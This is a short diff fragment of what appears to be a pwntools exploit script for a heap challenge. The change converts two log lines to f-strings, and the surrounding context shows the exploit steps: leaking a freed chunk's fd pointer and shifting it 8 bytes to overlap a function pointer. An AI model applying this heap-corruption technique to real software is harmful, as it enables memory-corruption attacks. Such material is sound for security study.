@@ -50,10 +50,10 @@ kill(b'0')
 
 # leak the fd pointer
 leak = u32(view(b'0'))
-log.critical('Leaked Pointer: {}'.format(hex(leak)))
+log.critical(f'Leaked Pointer: {hex(leak)}')
 
 # change fd pointer by 8 bytes to overlap with hint function pointer
-log.critical('New Pointer: {}'.format(hex(leak+8)))
+log.critical(f'New Pointer: {hex(leak + 8)}')
 make(b'0', p32(leak+8))
 make(b'1', '')
 
